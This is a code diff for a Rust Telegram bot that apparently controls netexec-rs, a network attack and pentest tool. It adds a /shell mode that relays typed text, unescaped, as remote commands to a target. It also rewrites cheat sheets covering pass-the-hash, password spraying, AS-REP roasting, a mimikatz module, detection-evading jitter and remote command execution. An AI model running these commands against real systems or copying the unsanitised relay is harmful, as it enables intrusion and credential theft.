@@ -223,6 +223,8 @@ enum TelegramBotCommand {
     Broadcast(String),
     #[command(description = "View real-time system logs")]
     Logs,
+    #[command(description = "Enter interactive shell mode for the last target")]
+    Shell,
 }
 
 // --- 🛸 Main Dispatch Engine ---
@@ -416,6 +418,19 @@ async fn handle_command(
         TelegramBotCommand::Logs => {
             admin_show_logs(bot, msg).await?;
         }
+        TelegramBotCommand::Shell => {
+            let user_id = msg.from.as_ref().map(|u| u.id).unwrap_or(UserId(0));
+            let s = get_session(user_id);
+            if s.last_target.is_none() || s.last_protocol.is_none() {
+                let _ = bot.send_message(msg.chat.id, "❌ *SHELL ERROR*\nNo active target or protocol found in session history\\.").await;
+            } else {
+                update_session(user_id, |sess| sess._interactive_mode = true);
+                let text = format!("🐚 *SHELL MODE ACTIVATED*\n\nTarget: `{}`\nProtocol: `{}`\n\nType commands directly to execute\\. Type `exit` to return to mission control\\.", 
+                    markdown::escape(s.last_target.as_ref().unwrap()), 
+                    markdown::escape(s.last_protocol.as_ref().unwrap()));
+                let _ = bot.send_message(msg.chat.id, text).parse_mode(ParseMode::MarkdownV2).await;
+            }
+        }
     }
     Ok(())
 }
@@ -434,13 +449,25 @@ async fn handle_generic_stream(bot: Bot, msg: Message) -> Result<(), teloxide::R
                 .reply_markup(main_dashboard_markup())
                 .await;
         } else {
-            let _ = bot
-                .send_message(
-                    msg.chat.id,
-                    "🛰️ _Awaiting valid command structure\\.\\.\\._",
-                )
-                .parse_mode(ParseMode::MarkdownV2)
-                .await;
+            let user_id = msg.from.as_ref().map(|u| u.id).unwrap_or(UserId(0));
+            let s = get_session(user_id);
+            if s._interactive_mode {
+                if text.to_lowercase() == "exit" {
+                    update_session(user_id, |sess| sess._interactive_mode = false);
+                    let _ = bot.send_message(msg.chat.id, "🚪 *SHELL DEACTIVATED*\nReturning to standard command mode\\.").parse_mode(ParseMode::MarkdownV2).await;
+                } else {
+                    let cmd = format!("{} {} -x \"{}\"", s.last_protocol.as_ref().unwrap(), s.last_target.as_ref().unwrap(), text);
+                    engine_execute_raw(bot, msg, cmd).await?;
+                }
+            } else {
+                let _ = bot
+                    .send_message(
+                        msg.chat.id,
+                        "🛰️ _Awaiting valid command structure\\.\\.\\._",
+                    )
+                    .parse_mode(ParseMode::MarkdownV2)
+                    .await;
+            }
         }
     }
     Ok(())
@@ -496,15 +523,17 @@ async fn handle_interactive_callbacks(
 // --- 🎨 UI & Presentation Logic ---
 
 async fn ui_send_dashboard(bot: Bot, msg: Message) -> Result<(), teloxide::RequestError> {
-    let text = "🛡️ *NETEXEC\\-RS PROFESSIONAL CONTROL CENTER*\n\n\
-        *Strategic Operations Commands:*\n\n\
-        🚀 *Deploy:* /run /smb /ssh /ldap /winrm\n\
+    let text = "🛸 *NETEXEC-RS: SUPERNOVA MISSION CONTROL*\n\n\
+        *Operational Command Matrix:*\n\n\
+        🚀 *Deployment:* /run /smb /ssh /ldap /winrm /mssql\n\
+        🐚 *Interactive:* /shell \\(persistent access\\)\n\
         🔍 *Intelligence:* /search /modules /protocols\n\
-        📡 *Recon:* /ping /portscan /dns /geo /reverse\n\
-        📋 *Shortcuts:* /shares /users /groups\n\
-        👤 *Identity:* /whoami /history /reset\n\
-        ⚙️ *System:* /status /guide /cheat /about\n\n\
-        _Rank: master\\-operator_ ◈ _Node: rusty\\-reaper_".to_string();
+        📡 *Reconnaissance:* /ping /portscan /dns /geo\n\
+        📋 *Rapid Shortcuts:* /shares /users /groups\n\
+        👤 *Operator:* /whoami /history /reset\n\
+        ⚙️ *Infrastructure:* /status /guide /cheat /about\n\n\
+        ◈ _Status: Tactical Dominance Achieved_ ◈\n\
+        ◈ _Node: [REDACTED]_ ◈".to_string();
     let _ = bot
         .send_message(msg.chat.id, &text)
         .parse_mode(ParseMode::MarkdownV2)
@@ -533,20 +562,25 @@ async fn ui_send_protocol_console(bot: Bot, msg: Message) -> Result<(), teloxide
 }
 
 async fn ui_send_handbook(bot: Bot, msg: Message) -> Result<(), teloxide::RequestError> {
-    let text = "📜 *MASTER OPERATOR'S HANDBOOK*\n\n\
-        *1. Targeting Intelligence*\n\
-        • Individual: `10.0.0.1`\n\
-        • CIDR Range: `192.168.1.0/24`\n\
-        • IP List: `10.0.0.1-50`\n\n\
-        *2. Authentication Strategies*\n\
-        • Explicit: `-u admin -p Pass123`\n\
-        • Hash Injection: `-u admin -H <nt_hash>`\n\
-        • Spray Mode: `-u file.txt -p pass1 pass2` \\(Tried iteratively\\)\n\n\
-        *3. Module Integration*\n\
-        Attach scripts with `-M module_name`\\.\n\
-        Example: `/smb 192.168.1.5 -M mimikatz`\n\n\
-        *4. Advanced Optimization*\n\
-        Tune performance with `--threads 500` or `--timeout 120`\\.".to_string();
+    let text = "📖 *NETEXEC MASTER CLASS: OPERATOR'S HANDBOOK*\n\n\
+        *1. Unified Targeting Intelligence*\n\
+        • Single Target: `10.0.0.1` or `target.pro`\n\
+        • CIDR Networks: `192.168.1.0/24`\n\
+        • Range Scanning: `10.0.0.1-10.0.0.50`\n\
+        • File Discovery: `/run smb targets.txt`\n\n\
+        *2. Authentication Matrix*\n\
+        • Standard: `-u admin -p Pass123`\n\
+        • Pass-the-Hash: `-u admin -H <nt_hash>`\n\
+        • Kerberos Forge: `-k --aes-key <key> --kdc-host <dc>`\n\
+        • Credential Spray: `-u users.txt -p pass.txt` \\(Brute-force mode\\)\n\n\
+        *3. Protocol & Module Deployment*\n\
+        Execute tasks with `/run <proto> <target> [options]`\n\
+        Attach offensive payloads with `-M <module_name>`\n\n\
+        *4. Strategic Options*\n\
+        • Speed: `--threads 500` \\(Max concurrency\\)\n\
+        • Stealth: `--jitter 1500` \\(Avoid detection\\)\n\
+        • Persistence: `--continue-on-success` \\(Keep trying\\)\n\n\
+        _Use /cheat for a tactical reference of all handlers_ ◈".to_string();
     let _ = bot
         .send_message(msg.chat.id, text)
         .parse_mode(ParseMode::MarkdownV2)
@@ -556,11 +590,11 @@ async fn ui_send_handbook(bot: Bot, msg: Message) -> Result<(), teloxide::Reques
 
 async fn ui_send_about(bot: Bot, msg: Message) -> Result<(), teloxide::RequestError> {
     let text = format!(
-        "◈ *NETEXEC\\-RS MASTER SUITE* ◈\n\n\
-        *Version:* `{}`\n\
-        *Codename:* `{}`\n\
-        *Core Edition:* `0.1.0\\-alpha`\n\n\
-        Designed by elite security engineers for cross\\-platform network operation and security research\\. Built exclusively in Pure Rust 🦀\\.",
+        "🛰️ *NETEXEC-RS MASTER CLASS SUITE: SUPERNOVA EDITION*\n\n\
+        *Core Engine:* `Pure Rust v0.1.0-RustReaper`\n\
+        *Interface:* `Telegram Professional v{}`\n\
+        *Signifier:* `{}`\n\n\
+        This platform represents the pinnacle of autonomous security research tools, providing a single, unified interface for cross-protocol exploitation, reconnaissance, and post-exploitation orchestration. Built without compromise using high-concurrency systems for the modern operator.",
         markdown::escape(BOT_VERSION), markdown::escape(MASTER_CODENAME)
     );
     let _ = bot
@@ -1238,14 +1272,28 @@ async fn engine_perform_task(args: Vec<String>) -> anyhow::Result<String> {
         .copied()
         .unwrap_or(DEFAULT_TIMEOUT_SECS);
 
+    let modules = sub_m
+        .get_one::<String>("module")
+        .map(|s| vec![s.clone()])
+        .unwrap_or_default();
+
+    let mut module_opts = std::collections::HashMap::new();
+    if let Some(opts) = sub_m.get_many::<String>("module-options") {
+        for opt in opts {
+            if let Some((k, v)) = opt.split_once('=') {
+                module_opts.insert(k.to_string(), v.to_string());
+            }
+        }
+    }
+
     let opts = ExecutionOpts {
         threads: conf_threads,
         timeout: Duration::from_secs(conf_timeout),
         jitter_ms: matches.get_one::<u64>("jitter").copied(),
         continue_on_success: sub_m.get_flag("continue-on-success"),
         no_bruteforce: sub_m.get_flag("no-bruteforce"),
-        modules: Vec::new(),
-        module_opts: std::collections::HashMap::new(),
+        modules,
+        module_opts,
     };
 
     let engine = ExecutionEngine::new(opts);
@@ -1376,15 +1424,21 @@ async fn session_purge(bot: Bot, msg: Message) -> Result<(), teloxide::RequestEr
 }
 
 async fn session_show_cheat(bot: Bot, msg: Message) -> Result<(), teloxide::RequestError> {
-    let text = "📑 *NXC OPERATOR CHEAT SHEET*\n\n\
-        ◈ *SMB Enumeration*\n\
-        `/run smb 10.0.0.0/24 -u guest -p \"\" --shares`\n\n\
-        ◈ *SSH Command Loop*\n\
-        `/ssh node\\-01 -u root -p pass -x \"cat /etc/passwd\"`\n\n\
-        ◈ *WinRM Admin Check*\n\
-        `/winrm 192.168.1.1 -u admin -H <nt_hash>`\n\n\
-        ◈ *LDAP User Extraction*\n\
-        `/ldap dc01 -u \"\" -p \"\" --users`".to_string();
+    let text = "📑 *TACTICAL OPERATOR CHEAT SHEET*\n\n\
+        ◈ *SMB Exploration*\n\
+        `/run smb 10.0.0.0/24 -u guest -p \"\" --shares`\n\
+        `/run smb target.local -u admin -H <hash> --users`\n\n\
+        ◈ *LDAP Reconnaissance*\n\
+        `/run ldap dc01.pro -u \"\" -p \"\" --gmsa`\n\
+        `/run ldap dc01.pro -u k.admin -p p --asreproasting`\n\n\
+        ◈ *SSH & WinRM Command Loops*\n\
+        `/run ssh node-01 -u root -p pass -x \"id\"`\n\
+        `/run winrm dc02 -u svc_adm -p pass -X \"Get-Process\"`\n\n\
+        ◈ *Database & App Attacks*\n\
+        `/run mssql sql01 -u sa -p pass -x \"whoami\"`\n\
+        `/run adb 192.168.1.50 --screenshot`\n\n\
+        ◈ *Master Control Pivot*\n\
+        Use `/shell` to enter interactive mode for your last target\\.".to_string();
     let _ = bot
         .send_message(msg.chat.id, text)
         .parse_mode(ParseMode::MarkdownV2)
